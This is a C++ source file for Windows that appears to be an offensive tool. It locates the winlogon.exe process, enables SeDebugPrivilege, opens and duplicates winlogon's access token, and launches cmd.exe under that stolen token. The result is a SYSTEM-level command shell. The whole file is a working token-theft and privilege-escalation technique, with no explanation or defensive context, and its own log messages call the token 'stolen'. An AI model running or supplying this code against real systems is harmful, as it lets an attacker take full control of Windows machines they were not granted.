#include <windows.h>
#include <iostream>
#include <Psapi.h>
#include <Tlhelp32.h>
#include <vector>

#define PROCESS_ARRAY 2048

std::string wcharToString(wchar_t input[1024])
{
	std::wstring wstringValue(input);
	std::string convertedString(wstringValue.begin(), wstringValue.end());
	return convertedString;
}

int LocateWinLogonProcess()
{

	DWORD lpidProcess[PROCESS_ARRAY], lpcbNeeded, cProcesses;
	EnumProcesses(lpidProcess, sizeof(lpidProcess), &lpcbNeeded);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		
	PROCESSENTRY32 p32;
	p32.dwSize = sizeof(PROCESSENTRY32);

	int processWinlogonPid;
	if (Process32First(hSnapshot, &p32))
	{
		do {
			if (wcharToString(p32.szExeFile) ==  "winlogon.exe")
			{
				std::cout << "[+] Located winlogon.exe by process name (PID " << p32.th32ProcessID << ")" <<  std::endl;
				processWinlogonPid = p32.th32ProcessID;
				return processWinlogonPid;
				break;
			}

		} while (Process32Next(hSnapshot, &p32));
		CloseHandle(hSnapshot);
	}	
}

void EnableSeDebugPrivilegePrivilege()
{
	LUID luid;
	HANDLE currentProc = OpenProcess(PROCESS_ALL_ACCESS, false, GetCurrentProcessId());

	if (currentProc)
	{
		HANDLE TokenHandle(NULL);
		BOOL hProcessToken = OpenProcessToken(currentProc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &TokenHandle);
		if (hProcessToken)
		{
			BOOL checkToken = LookupPrivilegeValue(NULL, L"SeDebugPrivilege", &luid);

			if (!checkToken)
			{
				std::cout << "[+] Current process token already includes SeDebugPrivilege\n" << std::endl;
			}
			else
			{
				TOKEN_PRIVILEGES tokenPrivs;

				tokenPrivs.PrivilegeCount = 1;
				tokenPrivs.Privileges[0].Luid = luid;
				tokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				BOOL adjustToken = AdjustTokenPrivileges(TokenHandle, FALSE, &tokenPrivs, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);

				if (adjustToken != 0)
				{
					std::cout << "[+] Added SeDebugPrivilege to the current process token" << std::endl;
				}
			}
			CloseHandle(TokenHandle);
		}
	}
	CloseHandle(currentProc);
}

BOOL CreateImpersonatedProcess(HANDLE NewToken)
{
	bool NewProcess;

	STARTUPINFO lpStartupInfo = { 0 };
	PROCESS_INFORMATION lpProcessInformation = { 0 };

	lpStartupInfo.cb = sizeof(lpStartupInfo);

	NewProcess = CreateProcessWithTokenW(NewToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &lpStartupInfo, &lpProcessInformation);

	if (!NewProcess)
	{
		std::cout << "[!] Failed to create a new process with the stolen TOKEN" << std::endl;
		return -1;
	}

	std::cout << "[+] Created a new process with the stolen TOKEN" << std::endl;

	CloseHandle(NewToken);
}

BOOL StealToken(int TargetPID)
{
	HANDLE hProcess		= NULL;
	HANDLE TokenHandle	= NULL;
	HANDLE NewToken		= NULL;
	BOOL OpenToken;
	BOOL Impersonate;
	BOOL Duplicate;

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, TargetPID);
	if (!hProcess)
	{
		std::cout << "[!] Failed to obtain a HANDLE to the target PID" << std::endl;
		return -1;
	}

	std::cout << "[+] Obtained a HANDLE to the target PID" << std::endl;

	OpenToken = OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &TokenHandle);
	if (!OpenToken)
	{
		std::cout << "[!] Failed to obtain a HANDLE to the target TOKEN" << std::endl;
		std::cout << GetLastError();
	}

	std::cout << "[+] Obtained a HANDLE to the target TOKEN" << std::endl;

	Impersonate = ImpersonateLoggedOnUser(TokenHandle);
	if (!Impersonate)
	{
		std::cout << "[!] Failed to impersonate the TOKEN's user" << std::endl;
		return -1;
	}

	std::cout << "[+] Impersonated the TOKEN's user" << std::endl;

	Duplicate = DuplicateTokenEx(TokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &NewToken);	
	if (!Duplicate)
	{
		std::cout << "[!] Failed to duplicate the target TOKEN" << std::endl;
		return -1;
	}

	std::cout << "[+] Duplicated the target TOKEN" << std::endl;

	CreateImpersonatedProcess(NewToken);

	CloseHandle(hProcess);
	CloseHandle(TokenHandle);
}

int main(int argc, char* argv[])
{
	int winLogonPID = LocateWinLogonProcess();

	EnableSeDebugPrivilegePrivilege();

	StealToken(winLogonPID);

	return 0;
}
